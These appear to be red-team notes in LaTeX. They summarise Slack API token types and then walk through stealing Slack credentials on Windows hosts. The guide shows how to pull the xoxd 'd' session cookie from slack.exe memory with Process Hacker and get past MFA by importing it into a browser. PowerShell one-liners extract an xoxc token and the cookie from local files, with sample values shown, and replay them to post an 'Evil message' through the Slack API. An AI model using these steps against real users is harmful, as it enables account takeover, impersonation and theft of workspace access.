
\section{API token}
\subsubsection{Token types} 
\href{https://api.slack.com/authentication/token-types}{Token types}
\begin{itemize}
    \item bot token: Bot tokens represent a bot associated with an app installed in a workspace. Unlike user tokens, they're not tied to a user's identity — they're only tied to your app. Since acting independently allows your app to stay installed even when an installing user is deactivated, using bot tokens is usually for the best.  New bot users can request individual scopes, similar to user tokens. Bot token strings begin with \verb+xoxb-+
    \item Workflow tokens: are a superset of bot tokens. They cannot perform actions that require a user scope. They expire and need to be refreshed, similar to service tokens. Workflow token strings begin with \verb+xwfp-+
    \item User tokens: User tokens represent workspace members. They are issued for the user who installed the app and for users who authenticate the app. When your app asks for OAuth scopes, they are applied to user tokens. You can use these tokens to take actions on behalf of users.
        \begin{itemize}
            \item User tokens gain the resource-based OAuth scopes requested in the installation process 
            \item User tokens represent the same access a user has to a workspace 
            \item User token strings begin with \verb+xoxp-+
        \end{itemize}
    \item Configuration tokens: App configuration tokens (or config tokens for short) are solely used to create and configure Slack apps using our App Manifest APIs
\end{itemize}



To clarify, xoxc tokens are special tokens that are used by the web client. These tokens are cookie dependent, so even if the token is somehow stolen, it would not be very useful.



\subsection{Cookie Theft on Windows Hosts}
Since Slack stores its cookies in a SQLite database with the same database schema as Chrome, it shouldn’t be too hard to modify a tool like SharpDPAPI’s SharpChrome to accommodate Slack cookie retrieval (shoutout to Lee Christensen for doubling back and actually implementing Slack support in this pull request). However, unlike the Chrome cookies database, which is likely storing many cookies we care about, the Slack cookies database only contains a single cookie we’re interested in.

To log into a user’s Slack without their password (regardless of multi-factor authentication [MFA]) we just need the d cookie — a value with the static prefix xoxd-. Using Process Hacker, we can actually identify the cookie within memory of a running slack.exe process:
\begin{itemize}
    \item 
        Open the parent slack.exe process (on occasion, you may need to check the child Slack processes)
    \item
        On the “Memory” tab, click “Strings” (and subsequently “OK” to gather results)
    \item
        Click “Filter” and return only results that contain or start with the string xoxd- (Figure 2)
\end{itemize}

After stealing the cookie, open up a browser and visit Slack or your target’s workspace URL. Use the browser’s developer tools or the EditThisCookie extension to add a new cookie with the name d and your stolen cookie value. Ensure the cookie’s domain is set to .slack.com — in some instances, I found leaving this to the default app.slack.com or <workspace>.slack.com wouldn’t work

\subsection{Commands}

\begin{verbatim}
[regex]::match((Select-String -Pattern "token" "$env:AppData\Slack\Local Storage\leveldb\*.ldb"), '("name":)(.+)(token":")([0-9a-zA-Z-]+)').Groups[4].Value
xoxc-142673704640-1013506190309-1003422863665-44c4817b920e2cdf58e6e3a3033ae3e4ef26dbb7b13fcc3479ea78e59e4d0ac9

[regex]::match((Select-String -Pattern ".slack.comd" -Context 0, 0 $env:AppData\Slack\Cookies), '(slack.comd)([a-zA-Z0-9%]+)/').Groups[2].Value
5FtusXZjgnidIW77X4wYncR8YRxreL5k6GPRjEoalrjTWSNhLdr%2Bapdx75wDENRHalfAR1QOt%2BI9uvO3pMOiU6sn10A5XlI2pFJj6IdBCWvAmtIyPuV2k1sQFepZiOEIin4sC17N54yXWQASte8jWXjnFi4n0aU%2F4RTOM%2BXYw9uD5CvJb9VgcJ%2FS

$token='xoxc-142673704640-1013506190309-1003422863665-44c4817b920e2cdf58e6e3a3033ae3e4ef26dbb7b13fcc3479ea78e59e4d0ac9'
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie
$cookie.Name = "d"
$cookie.Value = '5FtusXZjgnidIW77X4wYncR8YRxreL5k6GPRjEoalrjTWSNhLdr%2Bapdx75wDENRHalfAR1QOt%2BI9uvO3pMOiU6sn10A5XlI2pFJj6IdBCWvAmtIyPuV2k1sQFepZiOEIin4sC17N54yXWQASte8jWXjnFi4n0aU%2F4RTOM%2BXYw9uD5CvJb9VgcJ%2FS'
$cookie.Domain = "slack.com"
$session.Cookies.Add($cookie)
Invoke-WebRequest -Uri "https://app.slack.com/api/chat.postMessage?channel=[CHANNELID]&text=Evil%20message&pretty=1&token=$token"-Method GET -WebSession $session
\end{verbatim}

